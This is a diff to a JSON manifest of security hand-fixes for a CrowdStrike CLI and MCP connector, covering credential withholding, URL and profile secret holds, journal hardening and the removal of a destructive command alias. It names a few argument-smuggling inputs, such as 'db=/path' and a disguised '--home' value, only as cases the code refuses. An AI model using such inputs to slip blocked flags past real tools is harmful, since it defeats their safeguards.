+   "summary": "The generator's hidden Cobra alias `create` is removed from `incidents perform-action`, whose POST changes or closes an existing incident, so `incidents create` no longer runs it",
+   "why": "cli-printing-press gives a POST endpoint command the hidden alias `create`. `incidents perform-action` (POST /incidents/entities/incident-actions/v1) acts on incidents that already exist, so an agent that guessed the conventional verb ran it, and the alias appeared nowhere in help, agent-context or governance.md. Fleet gate: tools/maintainer/check_command_tree.py (failed on the 4.34.2 render, passes after). The canonical command name is unchanged; only the alias goes. A reprint re-adds it: remove it again. TestDestructiveCommandsDoNotAnswerToCreate failed while the alias was present.",
+   "spec_encode_followup": "Press-side: emit the `create` alias only for operations that create something.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/incidents_perform-action.go",
+     "not_contains": "[]string{\"create\"}"
+    },
+    {
+     "file": "cli/internal/cli/create_alias_destructive_test.go",
+     "contains": "func TestDestructiveCommandsDoNotAnswerToCreate(",
+     "min_count": 1,
+     "code_only": true
     }
    ]
   },
   {
    "id": "chatgpt-desktop-local-web-unsupported",
+   "class": "docs",
+   "status": "active",
    "summary": "README.md, mcp-install.md and page.json say the ChatGPT desktop app runs this connector locally (STDIO) and that ChatGPT on the web, Microsoft 365 Copilot / Copilot Studio and the Gemini app are not supported by msp-skills yet, with a link to the hosted-gateway comparison; no paid-plan list, no Developer Mode recipe, no 'ChatGPT connects only to remote servers'.",
    "why": "Docs fix approved 2026-11-03, following PR #502. OpenAI's MCP docs (https://learn.chatgpt.com/docs/extend/mcp) say the ChatGPT desktop app, Codex CLI and the IDE extension support MCP servers, add them as STDIO, and share MCP configuration; ChatGPT on the web uses remote MCP through plugins and does not read local Codex config. The old text listed ChatGPT plans, said ChatGPT connects only to remote servers, and on the reprinted connectors told users to host the connector over HTTPS for a Developer Mode connector and Copilot Studio; SECURITY.md pauses HTTP mode until each connector is reprinted. README.md, mcp-install.md and page.json are regenerated by msp-skills-publish onboard.py, whose template still writes the old ChatGPT text, so without this entry a re-onboard or reprint silently restores it.",
-   "status": "active",
    "spec_encode_followup": "Change the ChatGPT, Microsoft 365 Copilot and Gemini app text in onboard.py (cc-skills msp-skills-publish) so a regeneration writes this wording itself, then this entry can be retired.",
    "asserts": [
     {
@@ -857,6 +1673,589 @@
      "not_contains": "connects only to remote"
     }
    ]
+  },
+  {
+   "id": "credkit-wiring",
+   "class": "credential-kit",
+   "status": "active",
+   "summary": "The shared credential kit (tools/maintainer/credkit, vendored at cli/internal/credkit) is wired by hand and replaces this connector's own credential layer. internal/credwire/declarations.go holds the one Declarations literal; each main starts with credkit.Start and ends with credkit.Exit (the MCP main's body returns every exit code to it); the MCP server reads stdio through credkit.MCPIn, writes through credkit.MCPOut, runs every tool under credkit.MCPTools and serves HTTP through credkit.MCPHTTP; every API, token, fleet, feedback, deliver and probe request goes through credkit.Transport (cliutil.OutboundGuard; for the API client under the origin pin, so the guard judges what is really sent); every file write except the 0600 credential store and the config files goes through the kit (cliutil.AtomicWriteCredentialFile is that declared exemption); a config file read again after startup is held by credkit.HoldBody before it is parsed; the MCP server's CLI children and the macOS ACL helper run through credkit.RunCommand; the MCP HTTP server's own --tls-key material is held before it serves (bound to no origin). CredentialFields leaves out client_id (the first field of the token form; its value is held from every source it comes from) and ResponseFields names every credential a Falcon response can carry.",
+   "why": "The hand-wired layer (cliutil/crowdstrike_output.go, crowdstrike_secrets.go, crowdstrike_decoded.go, crowdstrike_scattered.go, secret_funnel*.go, the store's withholding driver and the cli and mcp filters, ported from appdirect) duplicated what the kit now owns for every connector. One contract, one matcher and one set of sinks replace it, and a matcher fix reaches this connector by vendoring. Seen failing on the layer and passing on the kit: TestKitMCPHTTPWithoutATokenSaysWhy (a token-less --transport http launch exited 1 with nothing on stderr: os.Exit cut the filter pipe) and TestKitDoctorJSONIsAVerdict (the layer withheld the whole doctor --json document). Seen failing with the kit wiring removed: TestKitMCPIncomingHeldBeforeDispatch (MCPArguments), TestKitMalformedConfigHeldBeforeStartupOutput (Files and the parse holds), TestKitMCPHTTPTokenNeverPrinted (SecretEnv), TestKitJournalHoldsNoCredential.",
+   "spec_encode_followup": "Press-side: generate main, the sinks and a Declarations literal against the kit.",
+   "asserts": [
+    {
+     "file": "cli/cmd/crowdstrike-cli/main.go",
+     "contains": "credkit.Start(credwire.Declarations)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/crowdstrike-mcp/main.go",
+     "contains": "credkit.Start(credwire.Declarations)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/crowdstrike-cli/main.go",
+     "contains": "credkit.Exit(code)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/crowdstrike-mcp/main.go",
+     "contains": "credkit.Exit(run())",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/crowdstrike-mcp/main.go",
+     "contains": "server.WithToolHandlerMiddleware(credkit.MCPTools)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/crowdstrike-mcp/main.go",
+     "contains": "Listen(ctx, credkit.MCPIn(os.Stdin), credkit.MCPOut())",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/crowdstrike-mcp/main.go",
+     "contains": "credkit.MCPHTTP(inner)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "var Declarations = credkit.Declarations{",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "CredentialFields: []string{\"client_secret\", \"refresh_token\", \"access_token\", \"token\", \"password\", \"api_key\", \"apikey\"},",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "MCPArguments: []string{\"client_id\", \"client_secret\", \"client-id\", \"client-secret\", \"access_token\", \"refresh_token\", \"token\", \"password\"},",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "\"CROWDSTRIKE_MCP_HTTP_TOKEN\",",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "{Source: \"env:CROWDSTRIKE_MCP_HTTP_TOKEN\", Allowed: nil},",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "Files:  credentialFiles,",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/crowdstrike-mcp/main.go",
+     "contains": "holdTLSKey(*tlsKey)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/crowdstrike-mcp/tls_key_hold.go",
+     "contains": "credkit.Hold(\"minted:tls-key\", append(body, strings.Join(body, \"\"))...)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/credkit_hold.go",
+     "contains": "var OutboundGuard = credkit.Transport",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/crowdstrike_guard.go",
+     "contains": "inner := cliutil.OutboundGuard(next)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/oauth_token.go",
+     "contains": "c.Transport = OutboundGuard(c.Transport)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/feedback.go",
+     "contains": "Transport: credkit.Transport(nil)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deliver.go",
+     "contains": "Transport: credkit.Transport(nil)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/probe.go",
+     "contains": "Transport: credkit.Transport(nil)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "err := credkit.RunCommand(cmd)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/darwin_acl_darwin.go",
+     "contains": "err := credkit.RunCommand(cmd)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "cliutil.HoldBody(data)",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "credkit.AppendFile(p, append(line, '\\n'), 0o600)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/teach_log.go",
+     "contains": "credkit.OpenFile(p, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/profile.go",
+     "contains": "credkit.WriteFile(tmp, data, 0o600)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/platform/profile.go",
+     "contains": "credkit.WriteFile(tmpName, data, 0o600)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/credentials.go",
+     "contains": "HoldBody(data)",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/credentials.go",
+     "contains": "if err := AtomicWriteCredentialFile(path, data, 0o600, 0o700); err != nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/paths.go",
+     "contains": "func AtomicWriteCredentialFile(path string, data []byte, fileMode, dirMode os.FileMode) error {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/crowdstrikeblackbox/sinks_test.go",
+     "contains": "func TestEveryHTTPClientIsGuarded",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/crowdstrikeblackbox/writers_test.go",
+     "contains": "func TestEveryFileWritePassesTheKit",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/crowdstrikeblackbox/blackbox_test.go",
+     "contains": "func TestOrdinaryRecordsStillPrint",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/crowdstrikeblackbox/blackbox_test.go",
+     "contains": "func TestOrdinaryRecordsReachEveryFile",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/crowdstrikeblackbox/kit_classes_test.go",
+     "contains": "func TestKitMCPHTTPWithoutATokenSaysWhy",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/crowdstrikeblackbox/kit_classes_test.go",
+     "contains": "func TestKitDoctorJSONIsAVerdict",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/crowdstrikeblackbox/kit_classes_test.go",
+     "contains": "func TestKitMCPIncomingHeldBeforeDispatch",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/crowdstrikeblackbox/kit_classes_test.go",
+     "contains": "func TestKitMalformedConfigHeldBeforeStartupOutput",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/crowdstrikeblackbox/kit_classes_test.go",
+     "contains": "func TestKitJournalHoldsNoCredential",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/crowdstrikeblackbox/kit_classes_test.go",
+     "contains": "func TestKitMCPHTTPTokenNeverPrinted",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "credkit-sqlite-every-handle",
+   "class": "credential-kit",
+   "status": "active",
+   "summary": "Every SQLite handle goes through credkit.SQLDriver: internal/credsql registers the one driver and every sql.Open in the program names it (the store, its read-only opener and probe, the platform migration). The MCP sql value cap is a DSN parameter (credsql.LengthLimitParam) that credsql applies as each connection opens.",
+   "why": "A statement's text and bound values are a sink of their own, reads included, so a handle on the bare driver would run a statement carrying a credential and withhold only the row afterwards. The hand withholding driver it replaces wrapped the read-write store only.",
+   "spec_encode_followup": "Press-side: generate store, migration and MCP sql opens against one kit-wrapped driver name, and express the MCP sql value cap as a connection-open setting.",
+   "asserts": [
+    {
+     "file": "cli/internal/credsql/credsql.go",
+     "contains": "sql.Register(Driver, credkit.SQLDriver(cappedSQLite()))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "sql.Open(credsql.Driver,",
+     "min_count": 4,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/platform/migration.go",
+     "contains": "sql.Open(credsql.Driver,",
+     "min_count": 4,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "credsql.LengthLimitParam",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "credkit-startup-config-argv",
+   "class": "credential-kit",
+   "status": "active",
+   "summary": "The kit's startup discovery (credentialFiles in internal/credwire/declarations.go) reads the command line as the program does: it builds cli.RootCmd, lets Cobra pick the command and pflag parse its flags (cobraPathFlags), then resolves --config and --home with config.ReadPaths (config.Load's own rules, credentials.toml and the legacy file included). When argv does not parse it names every candidate, the environment's first.",
+   "why": "A hand argv scanner reads a flag value as a flag (teach --notes --home=<fake>), so it can hold the wrong config file, leave the real credential unheld, and let the program print or persist it. TestCredentialFilesReadsArgvLikeCobra fails with the kit's FlagValues scan in place of the Cobra parse.",
+   "spec_encode_followup": "Press-side: generate the declarations' Files from the command tree the CLI executes, never a hand argv scan.",
+   "asserts": [
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "if configPath, home, ok := cobraPathFlags(args); ok {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "func cobraPathFlags(args []string) (configPath, home string, ok bool) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "files, err := config.ReadPaths(configPath)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/credkit_paths.go",
+     "contains": "func ReadPaths(configPath string) ([]string, error) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/argv_files_test.go",
+     "contains": "func TestCredentialFilesReadsArgvLikeCobra",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "credkit-url-credentials-held",
+   "class": "credential-kit",
+   "status": "active",
+   "summary": "Startup holds the password and every query value of each URL setting with the kit's own reader, credkit.HoldURL: CROWDSTRIKE_BASE_URL, CROWDSTRIKE_TOKEN_URL and CROWDSTRIKE_FEEDBACK_ENDPOINT (credwire holdURLSettings), and the base_url and token_url of every file Declarations.Files names (holdConfigURLs); a config the MCP server reads again after startup holds them the same way (config.holdURLSettings). CROWDSTRIKE_TOKEN_URL and CROWDSTRIKE_FEEDBACK_ENDPOINT are Declarations.URLEnv entries. HoldURL reads the password in an address with a typo (https//u:pw@h, u:pw@h, https;//) at any length, numbers included. No URL inside free text is read: contract section 1 does not list it.",
+   "why": "TestKitURLSettingPasswordNeverPrinted, seen failing with these holds removed: CROWDSTRIKE_BASE_URL='https//u:87654321@127.0.0.1:1' devices query-by-filter --json, doctor and doctor --json printed the password back (a connection error, doctor's base_url), and so did the same base_url in config.toml; the kit's BaseURL and URLEnv readers read only a well-formed URL.",
+   "spec_encode_followup": "Kit-side: let BaseURL and URLEnv read through HoldURL so no connector needs this.",
+   "asserts": [
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "credkit.HoldURL(\"userinfo\", v)",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "URLEnv: []string{\"CROWDSTRIKE_TOKEN_URL\", \"CROWDSTRIKE_FEEDBACK_ENDPOINT\"},",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "\tholdURLSettings()\n\tfiles := filesFor(args)\n\tholdConfigURLs(files)\n",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/credkit_paths.go",
+     "contains": "func holdURLSettings(c *Config) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/credkit_paths.go",
+     "contains": "cliutil.HoldURL(\"userinfo\", v)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "holdURLSettings(cfg)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/crowdstrikeblackbox/kit_sources_test.go",
+     "contains": "func TestKitURLSettingPasswordNeverPrinted",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "credkit-profiles-held",
+   "class": "credential-kit",
+   "status": "active",
+   "summary": "A run-profile store (profiles.json) is read at startup and filtered, not held whole: a value is held when it is under a flag a run profile does not apply (cli.RunProfileFlagAllowed: a flag this CLI lacks, a credential flag's name, --client-id included), every member of a duplicate key included (eachProfileValue walks the JSON tokens; json.Unmarshal keeps only the last); a value under base-url gives up what credkit.HoldURL reads (a whole address is held only when it has no host); a store that does not parse as the program reads it is held by credkit.HoldBody. Free text (a description, a URL in a --deliver value) is not read.",
+   "why": "A profile is applied after the kit started. Listing it in Declarations.Files would hold every saved flag value, so an ordinary --select would withhold ordinary output, and a base-url held whole withholds every output naming https and its host. Ruling 19 / publish-common item 8(c): profile values under a credential flag's name or base-url are sources; free text is not. TestKitRunProfilesHeldAtStartup fails with the startup hold removed.",
+   "spec_encode_followup": "Press-side: generate this hold with the profile store.",
+   "asserts": [
+    {
+     "file": "cli/internal/cliutil/credkit_hold.go",
+     "contains": "func HoldRunProfileStore(data []byte, allowed func(flag string) bool) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/credkit_hold.go",
+     "contains": "func eachProfileValue(data []byte, f func(flag, value string)) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/credkit_hold.go",
+     "contains": "HoldURL(\"minted:profile\", value)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/credkit_hold.go",
+     "contains": "HoldBody(data)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "cliutil.HoldRunProfileStore(data, cli.RunProfileFlagAllowed)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/credkit_profiles.go",
+     "contains": "func RunProfileStorePaths() []string {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/credkit_profiles.go",
+     "contains": "\"client-id\")",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/crowdstrikeblackbox/kit_sources_test.go",
+     "contains": "func TestKitRunProfilesHeldAtStartup",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "journal-credential-hardening",
+   "class": "secret-persisted",
+   "status": "active",
+   "summary": "The learn journal keeps no text the operator typed in place of a declared name: the CROWDSTRIKE_LEARN_SESSION override is stored as \"o:\" plus the same 64-bit SHA-256 hash the harness session ids get under \"h:\"; argv_shape records only flag names the invoked command declares under exactly the typed name and every other name as the \"<undeclared>\" placeholder (redacted), and nothing after \"--\"; failed_flag is never kept as typed (\"--<undeclared>\" when Cobra matched it to a declared flag, otherwise dropped); teach.log's missing --query lines record argument counts. Every journal line is appended through credkit.AppendFile, so one that repeats a held credential is withheld too. journal_credential_hardening_test.go drives each path with a credential, not held and held, and fails if it reaches any file under the test home.",
+   "why": "Press 4.34.2 (learn/journal.go.tmpl) returns the override raw from JournalSessionKey, so a credential set there is written to journal-*.jsonl on every command, version included, and records every typed flag name, so a credential typed as a flag name (or after --) becomes an argv_shape key and the failed_flag; teach.log records the raw arguments of a teach with no --query. TestJournalCredentialHardening failed on the generated code (19 subtests). Known limits: a guessable override can be confirmed by hashing guesses; entries an older build wrote stay until the 14-day retention deletes their segment; recall and teach query text is kept as the press designs it.",
+   "spec_encode_followup": "Press-side: learn/journal.go.tmpl should hash the LEARN_SESSION override as it hashes harness ids, and JournalArgvShape should take the invoked command's declared-flag lookup and record any other name as a placeholder, stopping at \"--\"; the failed flag should be the placeholder too, and teach.log should not echo raw arguments.",
+   "asserts": [
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "return \"o:\" + hashHarnessSession(v)\n\t}",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "not_contains": "journalSessionEnvVar)); v != \"\" {\n\t\treturn v\n"
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "const journalUndeclaredFlag = \"<undeclared>\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "func JournalArgvShape(args []string, isBoolFlag, isDeclared func(name string) bool) map[string]string {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "if tok == \"--\" {\n\t\t\tbreak\n\t\t}\n\t\tif !strings.HasPrefix(tok, \"-\") || tok == \"-\" {\n\t\t\tcontinue\n\t\t}",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "if isDeclared == nil || !isDeclared(name) {\n\t\t\tshape[journalUndeclaredFlag] = journalClassRedacted\n\t\t\tcontinue\n\t\t}\n\t\tswitch {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "if entry.FailedFlag != \"\" && entry.SuggestedFlag != \"\" {\n\t\tentry.FailedFlag = \"--\" + journalUndeclaredFlag\n\t} else {\n\t\tentry.FailedFlag = \"\"\n\t}",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "lookupFlag := func(name string) *pflag.Flag {\n\t\tf := target.Flags().Lookup(name)\n\t\tif f == nil {\n\t\t\tf = target.InheritedFlags().Lookup(name)\n\t\t}\n\t\tif f == nil && len(name) == 1 {\n\t\t\tf = target.Flags().ShorthandLookup(name)\n\t\t}\n\t\treturn f\n\t}",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "isDeclaredFlag := func(name string) bool {\n\t\tf := lookupFlag(name)\n\t\treturn f != nil && (f.Name == name || f.Shorthand == name)\n\t}",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "learn.JournalArgvShape(os.Args[1:], isBoolFlag, isDeclaredFlag)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "not_contains": "learn.JournalArgvShape(os.Args[1:], isBoolFlag)"
+    },
+    {
+     "file": "cli/internal/cli/teach.go",
+     "contains": "writeTeachErrLog(fmt.Sprintf(\"teach: missing --query (%d args, %d resources)\", len(args), len(resources)))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/teach.go",
+     "not_contains": "args=%v"
+    },
+    {
+     "file": "cli/internal/cli/teach_playbook.go",
+     "contains": "writeTeachErrLog(fmt.Sprintf(\"playbook amend: missing --query (%d args)\", len(args)))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/teach_playbook.go",
+     "not_contains": "args=%v"
+    },
+    {
+     "file": "cli/internal/learn/journal_credential_hardening_test.go",
+     "contains": "func TestJournalCredentialHardening(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal_test.go",
+     "contains": "entries[0].SessionKey != \"o:93da339544719ff4\"",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal_test.go",
+     "contains": "if e.FailedFlag != \"--<undeclared>\" {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal_test.go",
+     "contains": "name: \"undeclared names are only a placeholder\",",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  }
+ ],
+ "retired": [
+  {
+   "id": "env-oauth-secrets-not-persisted",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Press 4.34.0 keeps the environment markers through SaveTokens and generates MarkCredentialsExplicit, so a client ID or secret read from the environment is never written by a token save."
+  },
+  {
+   "id": "mcp-filesystem-destination-gate",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Press 4.34.0 builds a per-command blocked set (blockedDestinationFlags, blockedInputFlags, root control-plane flags), removes those flags from each tool's schema, refuses any undeclared argument name (so \"db=/path\" is refused) and skips '=' names in cliArgsFromMCP."
+  },
+  {
+   "id": "mcp-argv-value-joined",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Upstreamed as cli-printing-press #4647: every value-carrying branch of cliArgsFromMCP joins the value to its flag (--k=v, one element per list item), and the press generates TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag."
+  },
+  {
+   "id": "interim-http-security-note-2026-10-22",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: The note paused HTTP mode until a reprint because the build served HTTP with no token. Press 4.34.0 HTTP mode refuses to start without <PREFIX>_MCP_HTTP_TOKEN, answers 401 without the right bearer, binds 127.0.0.1 by default and refuses a non-loopback address without TLS; onboard.py now writes HTTP guidance that follows the binary (cc-skills #14) and never writes this note, so the entry would fail on every re-onboard."
+  },
+  {
+   "id": "mcp-file-flags-refused",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Press 4.34.0's cobratree mirror derives one blocked set per command (destination, input, mcp:write-flags, mcp:read-flags and root control-plane flags), leaves those flags out of the tool schema and refuses them, and any undeclared argument, by name."
   }
  ]
 }
